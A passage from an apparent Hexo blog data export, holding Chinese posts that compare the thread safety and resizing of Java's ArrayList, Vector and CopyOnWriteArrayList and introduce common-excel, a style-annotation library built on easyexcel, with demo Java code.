true;\n}\n```\n\n可以看出ArrayList的扩容是在ensureCapacityInternal方法中完成的，按着ensureCapacityInternal方法顺藤摸瓜可以找到grow方法这里才是真正的扩容代码，可以看出ArrayList扩容是直接用新的更长的数组替换掉旧的elementData数组，扩容后新容量是扩容前的容量的1.5倍，并与实际需求容量取最大值。\n\n```\n/**\n* Increases the capacity to ensure that it can hold at least the\n* number of elements specified by the minimum capacity argument.\n*\n* @param minCapacity the desired minimum capacity\n*/\nprivate void grow(int minCapacity) {\n    // overflow-conscious code\n    int oldCapacity = elementData.length;\n    int newCapacity = oldCapacity + (oldCapacity >> 1);\n    if (newCapacity - minCapacity < 0)\n    newCapacity = minCapacity;\n    if (newCapacity - MAX_ARRAY_SIZE > 0)\n    newCapacity = hugeCapacity(minCapacity);\n    // minCapacity is usually close to size, so this is a win:\n    elementData = Arrays.copyOf(elementData, newCapacity);\n}\n```\n\n## Vector\n\nVector类相比较ArrayList类，在成员变量上多了一个`protected int capacityIncrement`变量，主要用于扩容时的容量增长的计算，也就是说，Vector容量增长值的算法与ArrayList是有所不同的。\n\n将关注点置于Vector与ArrayList类的不同点上，阅读源码可发现Vector类在`get`、`add`、`set`、`addAll`、`forEach`、`toArray`等方法上，均加了`synchronized`关键字，这里可以看出，Vector类与ArrayList相比增加了线程安全方面的考虑。\n\n## CopyOnWriteArrayList\n\n成员变量上，主要增加了一个ReentrantLock变量。\n\n```\n/** The lock protecting all mutators */\nfinal transient ReentrantLock lock = new ReentrantLock();\n\n/** The array, accessed only via getArray/setArray. */\nprivate transient volatile Object[] array;\n```\n\n了解`ReentrantLock`类的都知道，这是一个可重入锁，也就是说CopyOnWriteArrayList和Vector一样都有线程安全方面的考虑。那CopyOnWriteArrayList和Vector的区别是什么呢？\n\n阅读CopyOnWriteArrayList源码发现，CopyOnWriteArrayList类在`get`、`forEach`、`toArray`等读的方法上，并没有加锁。在`add`、`set`、`addAll`等写的方法上除了使用了ReentrantLock锁之外，还增加了Array Copy的操作，使用Copy出的新的Array替换了就的Array，也正是因为这个操作，使得CopyOnWriteArrayList类在写的操作上不需要加锁。\n\n## 总结\n\nArrayList与 CopyOnWriteArrayList和Vector的区别在于，CopyOnWriteArrayList和Vector是线程安全的，ArrayList不是线程安全的。CopyOnWriteArrayList和Vector的区别在于，CopyOnWriteArrayList读时不加锁，Vector读时加锁，CopyOnWriteArrayList写时进行了Array的拷贝，而Vector不进行拷贝。从性能上看，不加锁的ArrayList读写速度肯定都是最快的，而Vector写的速度比CopyOnWriteArrayList快，CopyOnWriteArrayList读的速度比Vector块。\n\n","slug":"compare-list-vertor-cowlist","published":1,"updated":"2020-01-23T08:21:31.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck5qhi06f001lg0ukbj0u0l3s","content":"<p>ArrayList、Vector、CopyOnWriteArrayList均是实现了List接口的容器，他们之间究竟有何区别？为何JDK要同时提供这三种List？本文针对这个问题，进行深入的探究。</p>\n<h2 id=\"ArrayList\"><a href=\"#ArrayList\" class=\"headerlink\" title=\"ArrayList\"></a>ArrayList</h2><h3 id=\"1-研究一个类源码，首先了解它有哪些成员变量\"><a href=\"#1-研究一个类源码，首先了解它有哪些成员变量\" class=\"headerlink\" title=\"1. 研究一个类源码，首先了解它有哪些成员变量\"></a>1. 研究一个类源码，首先了解它有哪些成员变量</h3><p>查看ArrayList源码，可以很清除的看到，ArrayList最主要的成员变量就两个，变量的作用很明显，存储对象数组和记录数组内存储的变量个数，ArrayList内元素是以Array方式存储的，所以叫做ArrayList</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\">* The array buffer into which the elements of the ArrayList are stored.</span><br><span class=\"line\">* The capacity of the ArrayList is the length of this array buffer. Any</span><br><span class=\"line\">* empty ArrayList with elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA</span><br><span class=\"line\">* will be expanded to DEFAULT_CAPACITY when the first element is added.</span><br><span class=\"line\">*/</span><br><span class=\"line\">transient Object[] elementData; // non-private to simplify nested class access</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\">* The size of the ArrayList (the number of elements it contains).</span><br><span class=\"line\">*</span><br><span class=\"line\">* @serial</span><br><span class=\"line\">*/</span><br><span class=\"line\">private int size;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-针对特征功能的探究\"><a href=\"#2-针对特征功能的探究\" class=\"headerlink\" title=\"2. 针对特征功能的探究\"></a>2. 针对特征功能的探究</h3><p>ArrayList之所以是一个List，而不是Array，就在于ArrayList长度可以扩展，这里探究它在add元素时是如何进行扩容的。</p>\n<p>查看add代码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\">* Appends the specified element to the end of this list.</span><br><span class=\"line\">*</span><br><span class=\"line\">* @param e element to be appended to this list</span><br><span class=\"line\">* @return &lt;tt&gt;true&lt;/tt&gt; (as specified by &#123;@link Collection#add&#125;)</span><br><span class=\"line\">*/</span><br><span class=\"line\">public boolean add(E e) &#123;</span><br><span class=\"line\">    ensureCapacityInternal(size + 1);  // Increments modCount!!</span><br><span class=\"line\">    elementData[size++] = e;</span><br><span class=\"line\">    return true;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以看出ArrayList的扩容是在ensureCapacityInternal方法中完成的，按着ensureCapacityInternal方法顺藤摸瓜可以找到grow方法这里才是真正的扩容代码，可以看出ArrayList扩容是直接用新的更长的数组替换掉旧的elementData数组，扩容后新容量是扩容前的容量的1.5倍，并与实际需求容量取最大值。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\">* Increases the capacity to ensure that it can hold at least the</span><br><span class=\"line\">* number of elements specified by the minimum capacity argument.</span><br><span class=\"line\">*</span><br><span class=\"line\">* @param minCapacity the desired minimum capacity</span><br><span class=\"line\">*/</span><br><span class=\"line\">private void grow(int minCapacity) &#123;</span><br><span class=\"line\">    // overflow-conscious code</span><br><span class=\"line\">    int oldCapacity = elementData.length;</span><br><span class=\"line\">    int newCapacity = oldCapacity + (oldCapacity &gt;&gt; 1);</span><br><span class=\"line\">    if (newCapacity - minCapacity &lt; 0)</span><br><span class=\"line\">    newCapacity = minCapacity;</span><br><span class=\"line\">    if (newCapacity - MAX_ARRAY_SIZE &gt; 0)</span><br><span class=\"line\">    newCapacity = hugeCapacity(minCapacity);</span><br><span class=\"line\">    // minCapacity is usually close to size, so this is a win:</span><br><span class=\"line\">    elementData = Arrays.copyOf(elementData, newCapacity);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Vector\"><a href=\"#Vector\" class=\"headerlink\" title=\"Vector\"></a>Vector</h2><p>Vector类相比较ArrayList类，在成员变量上多了一个<code>protected int capacityIncrement</code>变量，主要用于扩容时的容量增长的计算，也就是说，Vector容量增长值的算法与ArrayList是有所不同的。</p>\n<p>将关注点置于Vector与ArrayList类的不同点上，阅读源码可发现Vector类在<code>get</code>、<code>add</code>、<code>set</code>、<code>addAll</code>、<code>forEach</code>、<code>toArray</code>等方法上，均加了<code>synchronized</code>关键字，这里可以看出，Vector类与ArrayList相比增加了线程安全方面的考虑。</p>\n<h2 id=\"CopyOnWriteArrayList\"><a href=\"#CopyOnWriteArrayList\" class=\"headerlink\" title=\"CopyOnWriteArrayList\"></a>CopyOnWriteArrayList</h2><p>成员变量上，主要增加了一个ReentrantLock变量。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/** The lock protecting all mutators */</span><br><span class=\"line\">final transient ReentrantLock lock = new ReentrantLock();</span><br><span class=\"line\"></span><br><span class=\"line\">/** The array, accessed only via getArray/setArray. */</span><br><span class=\"line\">private transient volatile Object[] array;</span><br></pre></td></tr></table></figure>\n\n<p>了解<code>ReentrantLock</code>类的都知道，这是一个可重入锁，也就是说CopyOnWriteArrayList和Vector一样都有线程安全方面的考虑。那CopyOnWriteArrayList和Vector的区别是什么呢？</p>\n<p>阅读CopyOnWriteArrayList源码发现，CopyOnWriteArrayList类在<code>get</code>、<code>forEach</code>、<code>toArray</code>等读的方法上，并没有加锁。在<code>add</code>、<code>set</code>、<code>addAll</code>等写的方法上除了使用了ReentrantLock锁之外，还增加了Array Copy的操作，使用Copy出的新的Array替换了就的Array，也正是因为这个操作，使得CopyOnWriteArrayList类在写的操作上不需要加锁。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>ArrayList与 CopyOnWriteArrayList和Vector的区别在于，CopyOnWriteArrayList和Vector是线程安全的，ArrayList不是线程安全的。CopyOnWriteArrayList和Vector的区别在于，CopyOnWriteArrayList读时不加锁，Vector读时加锁，CopyOnWriteArrayList写时进行了Array的拷贝，而Vector不进行拷贝。从性能上看，不加锁的ArrayList读写速度肯定都是最快的，而Vector写的速度比CopyOnWriteArrayList快，CopyOnWriteArrayList读的速度比Vector块。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>ArrayList、Vector、CopyOnWriteArrayList均是实现了List接口的容器，他们之间究竟有何区别？为何JDK要同时提供这三种List？本文针对这个问题，进行深入的探究。</p>\n<h2 id=\"ArrayList\"><a href=\"#ArrayList\" class=\"headerlink\" title=\"ArrayList\"></a>ArrayList</h2><h3 id=\"1-研究一个类源码，首先了解它有哪些成员变量\"><a href=\"#1-研究一个类源码，首先了解它有哪些成员变量\" class=\"headerlink\" title=\"1. 研究一个类源码，首先了解它有哪些成员变量\"></a>1. 研究一个类源码，首先了解它有哪些成员变量</h3><p>查看ArrayList源码，可以很清除的看到，ArrayList最主要的成员变量就两个，变量的作用很明显，存储对象数组和记录数组内存储的变量个数，ArrayList内元素是以Array方式存储的，所以叫做ArrayList</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\">* The array buffer into which the elements of the ArrayList are stored.</span><br><span class=\"line\">* The capacity of the ArrayList is the length of this array buffer. Any</span><br><span class=\"line\">* empty ArrayList with elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA</span><br><span class=\"line\">* will be expanded to DEFAULT_CAPACITY when the first element is added.</span><br><span class=\"line\">*/</span><br><span class=\"line\">transient Object[] elementData; // non-private to simplify nested class access</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\">* The size of the ArrayList (the number of elements it contains).</span><br><span class=\"line\">*</span><br><span class=\"line\">* @serial</span><br><span class=\"line\">*/</span><br><span class=\"line\">private int size;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-针对特征功能的探究\"><a href=\"#2-针对特征功能的探究\" class=\"headerlink\" title=\"2. 针对特征功能的探究\"></a>2. 针对特征功能的探究</h3><p>ArrayList之所以是一个List，而不是Array，就在于ArrayList长度可以扩展，这里探究它在add元素时是如何进行扩容的。</p>\n<p>查看add代码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\">* Appends the specified element to the end of this list.</span><br><span class=\"line\">*</span><br><span class=\"line\">* @param e element to be appended to this list</span><br><span class=\"line\">* @return &lt;tt&gt;true&lt;/tt&gt; (as specified by &#123;@link Collection#add&#125;)</span><br><span class=\"line\">*/</span><br><span class=\"line\">public boolean add(E e) &#123;</span><br><span class=\"line\">    ensureCapacityInternal(size + 1);  // Increments modCount!!</span><br><span class=\"line\">    elementData[size++] = e;</span><br><span class=\"line\">    return true;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以看出ArrayList的扩容是在ensureCapacityInternal方法中完成的，按着ensureCapacityInternal方法顺藤摸瓜可以找到grow方法这里才是真正的扩容代码，可以看出ArrayList扩容是直接用新的更长的数组替换掉旧的elementData数组，扩容后新容量是扩容前的容量的1.5倍，并与实际需求容量取最大值。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\">* Increases the capacity to ensure that it can hold at least the</span><br><span class=\"line\">* number of elements specified by the minimum capacity argument.</span><br><span class=\"line\">*</span><br><span class=\"line\">* @param minCapacity the desired minimum capacity</span><br><span class=\"line\">*/</span><br><span class=\"line\">private void grow(int minCapacity) &#123;</span><br><span class=\"line\">    // overflow-conscious code</span><br><span class=\"line\">    int oldCapacity = elementData.length;</span><br><span class=\"line\">    int newCapacity = oldCapacity + (oldCapacity &gt;&gt; 1);</span><br><span class=\"line\">    if (newCapacity - minCapacity &lt; 0)</span><br><span class=\"line\">    newCapacity = minCapacity;</span><br><span class=\"line\">    if (newCapacity - MAX_ARRAY_SIZE &gt; 0)</span><br><span class=\"line\">    newCapacity = hugeCapacity(minCapacity);</span><br><span class=\"line\">    // minCapacity is usually close to size, so this is a win:</span><br><span class=\"line\">    elementData = Arrays.copyOf(elementData, newCapacity);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Vector\"><a href=\"#Vector\" class=\"headerlink\" title=\"Vector\"></a>Vector</h2><p>Vector类相比较ArrayList类，在成员变量上多了一个<code>protected int capacityIncrement</code>变量，主要用于扩容时的容量增长的计算，也就是说，Vector容量增长值的算法与ArrayList是有所不同的。</p>\n<p>将关注点置于Vector与ArrayList类的不同点上，阅读源码可发现Vector类在<code>get</code>、<code>add</code>、<code>set</code>、<code>addAll</code>、<code>forEach</code>、<code>toArray</code>等方法上，均加了<code>synchronized</code>关键字，这里可以看出，Vector类与ArrayList相比增加了线程安全方面的考虑。</p>\n<h2 id=\"CopyOnWriteArrayList\"><a href=\"#CopyOnWriteArrayList\" class=\"headerlink\" title=\"CopyOnWriteArrayList\"></a>CopyOnWriteArrayList</h2><p>成员变量上，主要增加了一个ReentrantLock变量。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/** The lock protecting all mutators */</span><br><span class=\"line\">final transient ReentrantLock lock = new ReentrantLock();</span><br><span class=\"line\"></span><br><span class=\"line\">/** The array, accessed only via getArray/setArray. */</span><br><span class=\"line\">private transient volatile Object[] array;</span><br></pre></td></tr></table></figure>\n\n<p>了解<code>ReentrantLock</code>类的都知道，这是一个可重入锁，也就是说CopyOnWriteArrayList和Vector一样都有线程安全方面的考虑。那CopyOnWriteArrayList和Vector的区别是什么呢？</p>\n<p>阅读CopyOnWriteArrayList源码发现，CopyOnWriteArrayList类在<code>get</code>、<code>forEach</code>、<code>toArray</code>等读的方法上，并没有加锁。在<code>add</code>、<code>set</code>、<code>addAll</code>等写的方法上除了使用了ReentrantLock锁之外，还增加了Array Copy的操作，使用Copy出的新的Array替换了就的Array，也正是因为这个操作，使得CopyOnWriteArrayList类在写的操作上不需要加锁。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>ArrayList与 CopyOnWriteArrayList和Vector的区别在于，CopyOnWriteArrayList和Vector是线程安全的，ArrayList不是线程安全的。CopyOnWriteArrayList和Vector的区别在于，CopyOnWriteArrayList读时不加锁，Vector读时加锁，CopyOnWriteArrayList写时进行了Array的拷贝，而Vector不进行拷贝。从性能上看，不加锁的ArrayList读写速度肯定都是最快的，而Vector写的速度比CopyOnWriteArrayList快，CopyOnWriteArrayList读的速度比Vector块。</p>\n"},{"title":"阿里Easy Excel自定义样式注解","date":"2019-07-31T14:36:06.000Z","keywords":"Easy Excel, 样式, 注解","rId":"MB-19073101","_content":"\n现在是第一版common-excel，基于`alibaba/easyexcel`依赖进行样式扩展封装而来的，增加了一些样式注解\n\n\n## 可以解决什么问题\n\n1. 注解式样式\n2. 代码方式自定义样式\n3. 冻结行列样式\n4. 合并单元格样式\n5. 设置内容下拉框\n6. 背景颜色\n7. 字体设置\n8. 列宽度设置\n9. 边框样式\n10. 居中方式\n11. 是否换行\n\n## 效果\n\n![img - 1](../static/MB19073101-1.png) \n\n![img - 2](../static/MB19073101-2.png) \n\n## DEMO\n\nmodel代码示例\n\n```\n\n@CellFreeze(freezeRow = 2, freezeCol = 2)\n// 宽度默认值\n@ColumnWidth(width = 40)\n// 同时作用于表标题和内容的样式默认值\n@CellStyle(fontStyle = @FontStyle(color = IndexedColors.LIGHT_BLUE, size = 14))\npublic class MyModel1 extends BaseRowModel {\n\n    // easyexcel 解析注解\n    @ExcelProperty(value={\"pri\", \"pr1\"}, index = 0)\n    private String pr1;\n\n    @ExcelProperty(value={\"pri\", \"pr2\"}, index = 1)\n    private String pr2;\n\n    @ExcelProperty(value = {\"propValue1\"}, index = 2)\n    // 数组方式指定的下拉框约束\n    @ExplicitConstraint(source = {\"aaa1\", \"aaa2\", \"aaa3\"})\n    @ColumnWidth(width = 100)\n    private String propValue1;\n\n    @ExcelProperty(value = {\"propValue2\"}, index = 3)\n    @ExplicitConstraint(enumSource = MyConstraintEnum.class)\n    private String propValue2;\n\n    @ExcelProperty(value = {\"score\"}, index = 4)\n    @ColumnWidth(width = 50)\n    private Integer score;\n\n    @ExcelProperty(value = {\"date\"}, index = 5, format = \"yyyy-MM-dd HH:mm:ss\")\n    private Date date;\n\n    public String getPr1() {\n        return pr1;\n    }\n\n    public void setPr1(String pr1) {\n        this.pr1 = pr1;\n    }\n\n    public String getPr2() {\n        return pr2;\n    }\n\n    public void setPr2(String pr2) {\n        this.pr2 = pr2;\n    }\n\n    public String getPropValue1() {\n        return propValue1;\n    }\n\n    public void setPropValue1(String propValue1) {\n        this.propValue1 = propValue1;\n    }\n\n    public String getPropValue2() {\n        return propValue2;\n    }\n\n    public void setPropValue2(String propValue2) {\n        this.propValue2 = propValue2;\n    }\n\n    public Integer getScore() {\n        return score;\n    }\n\n    public void setScore(Integer score) {\n        this.score = score;\n    }\n\n    public Date getDate() {\n        return date;\n    }\n\n    public void setDate(Date date) {\n        this.date = date;\n    }\n}\n```\n\n详细代码戳下方链接\n[仓库主页](https://github.com/Uetty/common-excel)\n\n[有标题头demo](https://github.com/Uetty/common-excel/blob/master/src/main/java/com/uetty/common/excel/demo/withhead/TestWithHeadModel.java)\n\n[无标题头demo1](https://github.com/Uetty/common-excel/blob/master/src/main/java/com/uetty/common/excel/demo/headless/TestHeadlessModel1.java)\n\n[无标题头demo2](https://github.com/Uetty/common-excel/blob/master/src/main/java/com/uetty/common/excel/demo/headless/TestHeadlessModel2.java)","source":"_posts/2019-07-31_Common_Excel.md","raw":"---\ntitle: 阿里Easy Excel自定义样式注解\ndate: 2019-07-31 22:36:06\ntags: open source\npermalink: common-excel\nkeywords: Easy Excel, 样式, 注解\nrId: MB-19073101\n---\n\n现在是第一版common-excel，基于`alibaba/easyexcel`依赖进行样式扩展封装而来的，增加了一些样式注解\n\n\n## 可以解决什么问题\n\n1. 注解式样式\n2. 代码方式自定义样式\n3. 冻结行列样式\n4. 合并单元格样式\n5. 设置内容下拉框\n6. 背景颜色\n7. 字体设置\n8. 列宽度设置\n9. 边框样式\n10. 居中方式\n11. 是否换行\n\n## 效果\n\n![img - 1](../static/MB19073101-1.png) \n\n![img - 2](../static/MB19073101-2.png) \n\n## DEMO\n\nmodel代码示例\n\n```\n\n@CellFreeze(freezeRow = 2, freezeCol = 2)\n// 宽度默认值\n@ColumnWidth(width = 40)\n// 同时作用于表标题和内容的样式默认值\n@CellStyle(fontStyle = @FontStyle(color = IndexedColors.LIGHT_BLUE, size = 14))\npublic class MyModel1 extends BaseRowModel {\n\n    // easyexcel 解析注解\n    @ExcelProperty(value={\"pri\", \"pr1\"}, index = 0)\n    private String pr1;\n\n    @ExcelProperty(value={\"pri\", \"pr2\"}, index = 1)\n    private String pr2;\n\n    @ExcelProperty(value = {\"propValue1\"}, index = 2)\n    // 数组方式指定的下拉框约束\n    @ExplicitConstraint(source = {\"aaa1\", \"aaa2\", \"aaa3\"})\n    @ColumnWidth(width = 100)\n    private String propValue1;\n\n    @ExcelProperty(value = {\"propValue2\"}, index = 3)\n    @ExplicitConstraint(enumSource = MyConstraintEnum.class)\n    private String propValue2;\n\n    @ExcelProperty(value = {\"score\"}, index = 4)\n    @ColumnWidth(width = 50)\n    private Integer score;\n\n    @ExcelProperty(value = {\"date\"}, index = 5, format = \"yyyy-MM-dd HH:mm:ss\")\n    private Date date;\n\n    public String getPr1() {\n        return pr1;\n    }\n\n    public void setPr1(String pr1) {\n        this.pr1 = pr1;\n    }\n\n    public String getPr2() {\n        return pr2;\n    }\n\n    public void setPr2(String pr2) {\n        this.pr2 = pr2;\n    }\n\n    public String getPropValue1() {\n        return propValue1;\n    }\n\n    public void setPropValue1(String propValue1) {\n        this.propValue1 = propValue1;\n    }\n\n    public String getPropValue2() {\n        return propValue2;\n    }\n\n    public void setPropValue2(String propValue2) {\n        this.propValue2 = propValue2;\n    }\n\n    public Integer getScore() {\n        return score;\n    }\n\n    public void setScore(Integer score) {\n        this.score = score;\n    }\n\n    public Date getDate() {\n        return date;\n    }\n\n    public void setDate(Date date) {\n        this.date = date;\n    }\n}\n```\n\n详细代码戳下方链接\n[仓库主页](https://github.com/Uetty/common-excel)\n\n[有标题头demo](https://github.com/Uetty/common-excel/blob/master/src/main/java/com/uetty/common/excel/demo/withhead/TestWithHeadModel.java)\n\n[无标题头demo1](https://github.com/Uetty/common-excel/blob/master/src/main/java/com/uetty/common/excel/demo/headless/TestHeadlessModel1.java)\n\n[无标题头demo2](https://github.com/Uetty/common-excel/blob/master/src/main/java/com/uetty/common/excel/demo/headless/TestHeadlessModel2.java)","slug":"common-excel","published":1,"updated":"2020-01-23T08:21:31.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck5qhi06h001ng0ukbiu3xjs0","content":"<p>现在是第一版common-excel，基于<code>alibaba/easyexcel</code>依赖进行样式扩展封装而来的，增加了一些样式注解</p>\n<h2 id=\"可以解决什么问题\"><a href=\"#可以解决什么问题\" class=\"headerlink\" title=\"可以解决什么问题\"></a>可以解决什么问题</h2><ol>\n<li>注解式样式</li>\n<li>代码方式自定义样式</li>\n<li>冻结行列样式</li>\n<li>合并单元格样式</li>\n<li>设置内容下拉框</li>\n<li>背景颜色</li>\n<li>字体设置</li>\n<li>列宽度设置</li>\n<li>边框样式</li>\n<li>居中方式</li>\n<li>是否换行</li>\n</ol>\n<h2 id=\"效果\"><a href=\"#效果\" class=\"headerlink\" title=\"效果\"></a>效果</h2><p><img src=\"../static/MB19073101-1.png\" alt=\"img - 1\"> </p>\n<p><img src=\"../static/MB19073101-2.png\" alt=\"img - 2\"> </p>\n<h2 id=\"DEMO\"><a href=\"#DEMO\" class=\"headerlink\" title=\"DEMO\"></a>DEMO</h2><p>model代码示例</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">@CellFreeze(freezeRow = 2, freezeCol = 2)</span><br><span class=\"line\">// 宽度默认值</span><br><span class=\"line\">@ColumnWidth(width = 40)</span><br><span class=\"line\">// 同时作用于表标题和内容的样式默认值</span><br><span class=\"line\">@CellStyle(fontStyle = @FontStyle(color = IndexedColors.LIGHT_BLUE, size = 14))</span><br><span class=\"line\">public class MyModel1 extends BaseRowModel &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    // easyexcel 解析注解</span><br><span class=\"line\">    @ExcelProperty(value=&#123;&quot;pri&quot;, &quot;pr1&quot;&#125;, index = 0)</span><br><span class=\"line\">    private String pr1;</span><br><span class=\"line\"></span><br><span class=\"line\">    @ExcelProperty(value=&#123;&quot;pri&quot;, &quot;pr2&quot;&#125;, index = 1)</span><br><span class=\"line\">    private String pr2;</span><br><span class=\"line\"></span><br><span class=\"line\">    @ExcelProperty(value = &#123;&quot;propValue1&quot;&#125;, index = 2)</span><br><span class=\"line\">    // 数组方式指定的下拉框约束</span><br><span class=\"line\">    @ExplicitConstraint(source = &#123;&quot;aaa1&quot;, &quot;aaa2&quot;, &quot;aaa3&quot;&#125;)</span><br><span class=\"line\">    @ColumnWidth(width = 100)</span><br><span class=\"line\">    private String propValue1;</span><br><span class=\"line\"></span><br><span class=\"line\">    @ExcelProperty(value = &#123;&quot;propValue2&quot;&#125;, index = 3)</span><br><span class=\"line\">    @ExplicitConstraint(enumSource = MyConstraintEnum.class)</span><br><span class=\"line\">    private String propValue2;</span><br><span class=\"line\"></span><br><span class=\"line\">    @ExcelProperty(value = &#123;&quot;score&quot;&#125;, index = 4)</span><br><span class=\"line\">    @ColumnWidth(width = 50)</span><br><span class=\"line\">    private Integer score;</span><br><span class=\"line\"></span><br><span class=\"line\">    @ExcelProperty(value = &#123;&quot;date&quot;&#125;, index = 5, 